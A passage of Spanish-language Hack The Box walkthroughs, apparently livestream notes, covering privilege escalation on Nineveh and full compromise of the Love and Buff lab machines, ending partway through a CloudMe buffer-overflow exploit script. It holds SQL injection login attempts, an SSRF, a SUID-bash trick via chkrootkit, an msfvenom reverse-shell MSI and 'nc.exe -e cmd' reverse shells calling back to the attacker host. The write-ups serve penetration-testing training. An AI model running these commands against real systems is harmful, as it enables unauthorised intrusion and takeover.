### Analizamos el sistema {-}

```bash
pwd
ls -l
cd ..
ls
cd ..
ls
```

Aqui vemos que hay un directorio llamado `ssl` que contiene otro directorio `secure_notes` y como todo esto esta en `/var/www/html`
miramos en firefox lo que es. `https://10.10.10.43/secure_notes` y vemos una imagen. Como el directorio se llama secure_notes, pensamos 
directamente en steganografia y nos descargamos la image

### Analizando los bits menos significativos de la imagen {-}

```bash
steghide info nineveh.png
file nineveh.png
exiftool nineveh.png
strings nineveh.png
```

El comando strings nos muestra una key id_rsa privada y una publica del usuario amrois. Como no tenemos accesso al ssh desde fuera copiamos esta clave 
en la maquina victima y le hacemos el tratamiento de siempre

### Conexion por SSH {-}

En la maquina victima:

```bash
cd /tmp
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa amrois@localhost
```

Ya estamos conectados como amrois y podemos leer la flag.

### Otra manera de conectarnos a la maquina {-}

Si durante el analisis del sistema hubieramos ido hasta mirar los processos que estan habiertos en background, ubieramos encontrado que la utilidad
`knockd` estava lanzada.

**Knockd** es una utilidad para escuchar o lanzar Port Knocking.

```bash
ps -faux
cat /etc/knockd.conf
```

Aqui podemos ver que si Knockamos los puertos 571,290,911 se abriria el puerto 22 al exterior y si Knockeamos los puertos 911,290,571 se ceraria.

lo comprobamos desde la maquina de atacante:

```bash
nmap -p22 10.10.10.43 --open -T5 -v -n
```

Aqui vemos quel puerto 22 esta cerrado

```bash
knock 10.10.10.43 571:tcp 290:tcp 911:tcp
nmap -p22 10.10.10.43 --open -T5 -v -n
```

Aqui vemos que el puerto 22 se a abierto, y desde aqui nos podemos connectar por ssh como el usuario amrois.








<!--chapter:end:15-Nineveh/15-03-GainingAccess.Rmd-->

## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
ls -la
id
sudo -l
cd /root
```

Aqui no vemos nada interesante y no podemos entrar en el directorio root.

#### Analisis de processos con PSPY {-}

instalamos la herramienta en la maquina de atacante y lo compartimos con un web server.

```bash
git clone https://github.com/DominicBreuker/pspy
cd pspy
go build -ldflags "-s -w" main.go
upx main
mv main pspy
python3 -m http.server 80
```

Desde la maquina victima, downloadeamos el fichero y lo lanzamos

```bash
wget http://10.10.14.8/pspy
chmod +x pspy
./pspy
```

Esperamos un poco y vemos que hay un script `/usr/bin/chkrootkit` que se ejecuta a interval regular de tiempo.

#### Priviledge escalation con chkrootkit {-}

```bash
searchsploit chkrootkit
```

Ya vemos que hay un exploit para Local Priviledge Escalation. Lo analizamos.

```bash
searchsploit -x 33899
```

Creamos un fichero llamado update en tmp

```bash
cd /tmp
echo '#!/bin/bash\n\nchmod 4755 /bin/bash' > update
chmod +x update
watch -n 1 ls -l /bin/bash
```

Ya podemos utilizar bash para convertirnos en root

```bash
bash -p
whoami
#Output

root
```

Ya hemos rooteado la maquina y podemos ver la flag.


<!--chapter:end:15-Nineveh/15-04-PrivilegeEscalation.Rmd-->

# Love {-}

## Introduccion {-}

La maquina del dia 07/08/2021 se llama Love
.

El replay del live se puede ver aqui

[![S4vitaar Love maquina](https://img.youtube.com/vi/bSTe009r_4M/0.jpg)](https://www.youtube.com/watch?v=bSTe009r_4M)

No olvideis dejar un like al video y un comentario...

<!--chapter:end:16-Love/16-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.239
```
ttl: 127 -> maquina Windows. 
Recordar que en cuanto a ttl respecta 64 = linux y 128 = windows. 
Pero comom estamos en hackthebox hay un nodo intermediario que hace que 
el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.239
```

Si consideras que va muy lento puedes meter los siguientes parametros para que valla mucho mas rapido el escaneo

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.239 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,4966,49667,49668,49669,49670 10.10.10.239 -oN targeted
```

| Puerto | Servicio       | Que se nos occure?              | Que falta? |
| ------ | -------------- | ------------------------------- | ---------- |
| 80     | http           | Web, fuzzing                    |            |
| 135    | rpc            |                                 |            |
| 139    | NetBios        |                                 |            |
| 443    | ssl (https)    |                                 |            |
| 445    | SMB            | Null session                    |            |
| 3306   | mssql?         |                                 |            |
| 5000   | http           |                                 |            |
| 5040   | http           |                                 |            |
| 5985   | WinRM          |                                 |            |
| 5986   | WinRM ssl      |                                 |            |
| 7680   | tcp panda-pub? |                                 |            |
| 47001  | http           |                                 |            |
| 49664  | msrpc          | puertos por defectos de windows |            |
| 49665  | msrpc          | puertos por defectos de windows |            |
| 49666  | msrpc          | puertos por defectos de windows |            |
| 49667  | msrpc          | puertos por defectos de windows |            |
| 49668  | msrpc          | puertos por defectos de windows |            |
| 49669  | msrpc          | puertos por defectos de windows |            |
| 49670  | msrpc          | puertos por defectos de windows |            |


### Analizando el SMB {-}

```bash
crackmapexec smb 10.10.10.239
smbclient -L 10.10.10.239 -N
```

Vemos que estamos en frente de una maquina Windows10 pro que se llama **Love** y poco mas

### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.239
whatweb https://10.10.10.239
```

Nada muy interesante aqui

#### Chequear el contenido de el certificado SSL con openssl {-}

```bash
openssl s_client -connect 10.10.10.239:443
```

vemos una direccion de correo `roy@love.htb` lo que quiere decir que tenemos un usuario y un dominio. 
Tambien vemos un dominio `staging.love.htb`, quiere decir que es posible que se aplique virtual hosting.
Lo añadimos al `/etc/hosts` de la maquina de atacante.


<div class="figure">
<img src="images/love-etc-hosts.png" alt="love virtual hosting" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-33)love virtual hosting</p>
</div>

#### Chequear la web los puertos web {-}

```bash
cat targeted | grep "http"
cat targeted | grep "http" | grep -oP '\d{1-5}/tcp'
```

Aqui descartamos el puerto **47001** y los puertos **5985-5986** que ya sabemos que son los **WinRM**.

Con firefox navigamos en la web para ver lo que porque hay mucho por mirar. 

- el puerto 80 nos muestra una pagina de login.
- el puerto 443 nos muestra un **Forbidden**.
- el puerto 5000 nos muestra un **Forbidden**.
- el dominio **staging.love.htb** nos muestra otra web


#### Chequeando el puerto 80 {-}

Aqui como estamos en un panel de inicio de session, intentamos cosas

- admin / admin
- 1 / hola
- 0 / hola
- -1 / hola
- ;" / hola
- 1' or 1=1-- - / #
- ' or sleep(5)-- - / #
- 1 and sleep(5)-- - / #
- 1000 / hola

Aqui no parece que este vulnerable a inyeccion SQL. Vamos a fuzzear la web


#### Fuzzing con WFuzz {-}

Fuzzeamos el puerto 80

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.239/FUZZ
```

Encontramos una ruta `/admin`. En la pagina admin vemos otro panel de inicio de session que no es la misma que la del `index.php`

#### Chequeando la pagina admin {-}

Aqui como estamos en un panel de inicio de session, intentamos cosas

- test / test
- admin / admin

Ya vemos por el mensaje de error quel usuario admin existe.


<!--chapter:end:16-Love/16-01-Enumeration.Rmd-->

## Evaluacion de vulnerabilidades {-}

### Analizamos la web staging.love.htb {-}

Aqui llegamos en una pagina **Free File Scanner**. si pinchamos el menu Demo vemos un input que nos pregunta por un file url.

Vamos a ver lo que pasa si le damos una url de nuestro equipo de atacante

### Injeccion HTML y SSRF {-}

```bash
vi index.html

<h1>Hola</h1>
<marquee>Se tenso</marquee>
```

Creamos un servicio http con python

```bash
python3 -m http.server 80
```

En la web ponemos la url de nuestro equipo `http://10.10.14.8/` y vemos que la web es vulnerable a una **Injeccion HTML**.
Intentamos con una pagina php

```bash
vi index.php

<?php
    system("whoami");
?>
```

Si ahora en la web le ponemos `http://10.10.14.8/index.php` no pasa nada quiere decir que esta en un contexto sanitizado.
Bueno aqui pensamos en un **SSRF** y intentamos cosas como `http://localhost/`. Esto nos muestra el panel de session que ya hemos analizado,
y probamos a ver si los puertos que tenian el mensaje **Forbidden** se pueden ahora burlar. 

Intentamos el puerto 5000, `http://localhost:5000/` y effectivamente se puede ver la pagina. A demas vemos aqui las credenciales del usuario **admin**.

Nos conectamos ahora con el usuario admin en el panel de administracion y pa dentro.

### Voting System vunlerability {-}

Aqui como una vez mas vemos el voting system, mirramos si un exploit existe para este gestor de contenido

```bash
searchsploit voting system
```

Encontramos un que permitte hacer Ejecucion Remota de comandos una vez autenticados. Como no tenemos claro que version del voting system es,
intentamos utilizar el script

```bash
cd exploits
searchsploit -m php/webapps/49445.py
mv 49445.py voting-system.py
vi voting-system.py
```

Aqui vemos que el exploit nos da directamente une reverse shell.



<!--chapter:end:16-Love/16-02-VulnerabilityAssesment.Rmd-->

## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Conexion desde la vulnerabilidad de Voting System {-}

1. Controlamos que las urls que estan en el script existen en la web.

    Aqui vemos que las urls no son exactamente las mismas y que hay que modificarlas un poquito.

1. Modificamos el script para que ataque el servicio de la maquina victima

    <div class="figure">
    <img src="images/love-votingsystem-rshell.png" alt="voting system reverse shell" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-34)voting system reverse shell</p>
    </div>

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Lanzamos el script.

    ```bash
    python3 voting-system.py
    ```

Ya estamos en la maquina.

<!--chapter:end:16-Love/16-03-GainingAccess.Rmd-->

## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
whoami
whoami /priv
whoami /all
```

Aqui no vemos nada de interesante.

```bash
cd c:\
cd PROGRA~1
dir
cd ..
cd PROGRA~2
dir
```

Investigamos un poco pero no vemos nada muy interesante. Decidimos lanzarle un WinPEAS

#### Analisis de vulnerabilidad Privesc con WINPEAS {-}

```bash
cd c:\Windows\Temp
mkdir EEEE
cd EEEE
```

Descargamos el `winpeasx64.exe` desde [https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe).

```bash
cd content
cp /home/s4vitar/Descargas/firefox/winPEASx64.exe .
python3 -m http.server 80
```

Lo descargamos desde la maquina victima y lo lanzamos.

```bash
certutil.exe -f -urlcache -split http://10.10.14.8/winPEASexe.exe winPEAS.exe
winPEAS.exe
```

Vemos algo interressante en Checking AlwaysInstallElevated

<div class="figure">
<img src="images/love-hklm-hkcu.png" alt="privesc hklm hkcu vuln" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-35)privesc hklm hkcu vuln</p>
</div>

Podemos seguir los pasos descritos en el link [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated)

1. crear un msi malicioso con msfvenom

    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f msi -o reverse.msi
    ```

1. lo enviamos a la maquina victima con el servidor http de python
1. nos ponemos en escucha por el puerto 443
1. lo ejecutamos desde la maquina victima

    ```bash
    msiexec /quiet /qn /i reverse.msi
    ```

Ya estamos a dentro con el usuario nt authority\system y podemos ver la flag.

<!--chapter:end:16-Love/16-04-PrivilegeEscalation.Rmd-->

# Buff {-}

## Introduccion {-}

La maquina del dia 09/08/2021 se llama Buff
.

El replay del live se puede ver aqui

[![S4vitaar Buff maquina](https://img.youtube.com/vi/8UZcKNFgt-M/0.jpg)](https://www.youtube.com/watch?v=8UZcKNFgt-M)

No olvideis dejar un like al video y un commentario...

## Requirements {-}

Este video toca un BufferOverflow de typo OSCP. Necessitareis tener:

- Una maquina windows7 32 bits
- El Deb de la maquina esta desabilitado
- Immunity debugger con el mona installado

<!--chapter:end:17-Buff/17-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.198
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.198
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.198 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p8080,7680 10.10.10.198 -oN targeted
```

| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 7680   | http     | Web, fuzzing       |            |
| 8080   | http     | Web, fuzzing       |            |

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.198:8080
```

Nada muy interressante aqui


#### Checkear la web el puerto 8080 {-}

- Vemos que hay un panel de inicio de session
- El Wappalizer no nos dice nada
- Hay unos cuantos links
    
    1. Packages
    1. Facilities
    1. About
    1. Contact

- En packages vemos un usuario potencial **mrb3n**
- Vemos que las extensiones de los ficheros son php
- Si pinchamos en Contact vemos que la web a sido echa con **Gym Management Software 1.0**

Vamos a ver si encontramos algo interressante con Gym Management Software 1.0


<!--chapter:end:17-Buff/17-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Buscamos exploit para Gym Management Software {-}

```bash
searchsploit Gym Management
```

Aqui vemos varias cosas

- SQL Injection
- Authentication Bypass
- Stored Cross Site Scripting
- Unauthenticated Remote Code Execution

Vamos a ver el script en python para el Unauthenticated Remote Code Execution

```bash
cd content
searchsploit -m 48506 .
mv 48506.py gym_management.py
cat gym_management.py
```

Analyzamos el script y lo comprobamos con firefox al mismo tiempo:

1. Ir a la pagina /upload.php que no mirra para una session de usuario authentificado

    - `http://10.10.10.198:8080/upload.php` Nos pone undefined id parameter.

1. Ponerle un parametro id en la GET request que appunte en el fichero deseado

    - `http://10.10.10.198:8080/upload.php?id=EEEE` nos hace algo.

1. Bypasseamos un archivo con una doble extension. (.php.png)
1. Bypasseamos el type check modificando el **Content-type** del fichero con `image/png`
1. Se pone un codigo malicioso en el body del fichero

Estos passos se pueden facilmente hacer a mano pero aqui vamos a utilizar el proprio exploit.



<!--chapter:end:17-Buff/17-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Conneccion por gym management {-}

```bash
python gym_management.py http://10.10.10.198:8080/
```

Ya estamos en la maquina victima. Pero estamos con una web shell. 

### Reverse Shell {-}

En la maquina de attackante enviamos un nc.exe a la maquina victima para tener una shell interactiva

```bash
locate nc.exe
cp /opt/SecLists/Web-Shells/FuzzDB/nc.exe .
python -m http.server 80
```

Con otra terminal, nos ponemos en escucha por el puerto 443

```bash
rlwrap nc -nlvp 443
```

desde la maquina victima, lo descargamos y lo ejecutamos

```bash
curl http://10.10.14.8/nc.exe -o nc.exe
./nc.exe -e cmd 10.10.14.8 443
```


Si le hacemos un type `C:\users\shaun\Desktop\user.txt` podemos ver la flag.

### Analyzando la maquina {-}

```bash
whoami
whoami /priv
whoami /all
```

Como no vemos nada interressante aqui, lanzaremos un binario que nos permitta enumerar el systema para
encontrar vias potenciales para escalar privilegios. Vamos a utilizar el **winpeas**

#### Analysis de vulnerabilidad Privesc con WINPEAS {-}

```bash
cd c:\Windows\Temp
mkdir EEEE
cd EEEE
```

Descargamos el `winpeasx64.exe` desde [https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe).

```bash
cd content
cp /home/s4vitar/Descargas/firefox/winPEASx64.exe .
python3 -m http.server 80
```

Lo descargamos desde la maquina victima y lo lanzamos.

```bash
certutil.exe -f -urlcache -split http://10.10.14.8/winPEASexe.exe winPEAS.exe
winPEAS.exe
```

En la parte `Searching executable files in non-default folders with write (equivalent) permissions` vemos que
el ususario shaun tiene AllAccess al ejecutable `C:\Users\shaun\Downloads\CloudMe_1112.exe`. Mirando por internet 
vemos que CloudMe es un servico que occupa el puerto **8888**. Lo comprobamos con `netstat`

A demas buscamos con searchsploit y vemos que este binario es vulnerable a un BufferOverflow.


<!--chapter:end:17-Buff/17-03-GainingAccess.Rmd-->

## BufferOverflow {-}

Aqui vamos a trabajar principalmente en la maquina windows. Analizando el exploit del BufferOverflow que nos da
searchsploit vemos que podemos descargarnos el binario `CloudMe_1112.exe` en el link `https://www.cloudme.com/downloads/CloudMe_1112.exe`.
Lo descargamos en la maquina Windows y lo installamos. La installacion es la typica de windows (next, next, next...).

Nos tenemos que crear un usuario y iniciar una session.

Una vez el programma lanzado, podemos comprobar que el servicio corre abriendo un cmd y lanzando el commando `netstat -nat`. Aqui vemos
que el puerto 8888 esta corriendo.

En esta situacion hay que entender que nosotros vamos a utilizar nuestra propria maquina windows como maquina de test. todo los passos siguientes
estaran echo en esta maquina y tendremos que hacerlo de nuevo en la maquina Buff. 

### Exponer el puerto 8888 hacia fuera {-}

Como este servicio es interno, el puerto 8888 no esta visible desde el exterior. Aqui utilizaremos **Chisel.exe** para hacer un port forwarding.
Descargamos manualmente **Chisel y 7zip**. 

1. En la maquina de attackante

    ```bash
    git clone https://github.com/jpillora/chisel
    cd chisel
    go build -ldflags "-w -s" .
    upx chisel
    chmod +x chisel
    ./chisel server --reverse --port 1234
    ```

1. En la maquina Windows

    ```bash
    ./chisel.exe client 192.168.0.16:1234 R:8888:127.0.0.1:8888
    ```


### Script en pyton para ejecutar el BufferOverflow {-}

En la maquina de atacante, nos creamos un script en python que nos permitte ejecutar el BufferOverflow. Este Script ira evolucionando
durante las etapas.

#### Etapa 1 : Denial Of Service {-}

El BufferOverflow viene de un error de sanitizacion durante el envio de una data que se espera a recivir un tamanio definido de data y sobre el
cual si un atcante decide enviarle mas data de lo previsto, hace petar el servicio. En el siguiente script vamos a enviar al servicio unas 5000 **A**
de data para ver si el servicio cae.

```python
#!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time

from pwn import *
from struct import pack

# Variables globales
remoteAddress = "127.0.0.1"

def executeExploit():
    payload = b"A" * 5000

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteAddress, 8888))
    s.send(payload)

if __name__ == "__main__":
    executeExploit()
```

Ejecutando el script vemos que el CloudMe para de functionnar el la maquina Windows. 

<div class="figure">
<img src="images/Buff-DOS.png" alt="BufferOverflow DOS" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-36)BufferOverflow DOS</p>
</div>


#### Etapa 2 : Analizando lo que pasa con Immunity Debugger {-}

En la maquina windows, arrancamos otra vez el servicio CloudMe y nos abrimos el Immunity Debugger.

Pinchamos en el menu File del Immunity Debugger a attach y seleccionamos el servicio CloudMe

<div class="figure">
<img src="images/Buff-ID_attach.png" alt="BufferOverflow Attach service" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-37)BufferOverflow Attach service</p>
</div>

Cuando lo lanzamos siempre nos va a poner el servicio en *PAUSED* y tenemos que darle al boton *PLAY*.

Desde la maquina victima lanzamos otra vez el exploit para ver lo que pasa.

```bash
python3 exploit.py
```

En el Immunity debugger podemos ver que se a vuelto a PAUSEAR y en la ventanita Registers (FPU) que hay cossas turbias.

##### Explicacion del stack {-}


<div class="figure">
<img src="images/Buff-stack_explanation.png" alt="BufferOverflow explicacion stack" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-38)BufferOverflow explicacion stack</p>
</div>

En el graphico vemos las **A** que es lo que suele passar cuando le enviamos data al programma, en este casso **A**. Si el buffer
definido no esta sanitizado correctamente y que le enviamos mas **A** de lo previsto, las **A** van subiendo hasta que sobre escriba
registros como el **EBP** y el **RET tambien llamado EIP**. Lo podemos ver en el Immunity Debugger aqui.

<div class="figure">
<img src="images/Buff-As.png" alt="BufferOverflow overflow with A" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-39)BufferOverflow overflow with A</p>
</div>

Aqui se puede ver un monton de "41414141" que 41 es el valor Hexadecimal ASCII de la lettra A. 

Lo critico aqui es cuando el atacante toma el control del **EIP (RET)** porque el **EIP** define donde appunta la siguiente instruccion a 
ejecutar. En el caso de las **A**, el programma cuando llega al EIP piensa que la siguiente instruccion que hay que ejecutar se encuentra en
la Memory Address 0x41414141 (porque la hemos sobre escrito), y claro como esta direccion no existe hace que el programma pete.

#### Etapa 3: Sobre escribir el EIP {-}

Como atacante, ahora tenemos que saver cuantas **A** tenemos que meter para sobre escribir el **EIP** con el valor que nosotros queremos meter.
La technica para que sea visual seria ponerl 0x42424242 al EIP que serian cuatro vecez la lettra **B**.

Hay una utlidad que nos permitte crear un pattern de caracteres aleatorios para encontrar mas facilmente donde se encuentra el EIP o mejor dicho cuantas **A**
tengo que poner antes de ponerle las **B**.

En la maquina de atacante

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
```

esto lo podemos copiar y ponerlo en nuestro exploit.

```python
#!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time

from pwn import *
from struct import pack

# Variables globales
remoteAddress = "127.0.0.1"

def executeExploit():
    payload = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7A
    e8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak
    0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2
    Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4A
    u5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az
    7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9
    Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1B
    k2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp
    4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6
    Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8B
    z9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf
    1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3
    Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5C
    p6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu
    8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0
    Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D
    f3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk
    5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7
    Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9D
    v0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea
    2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4
    Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6E
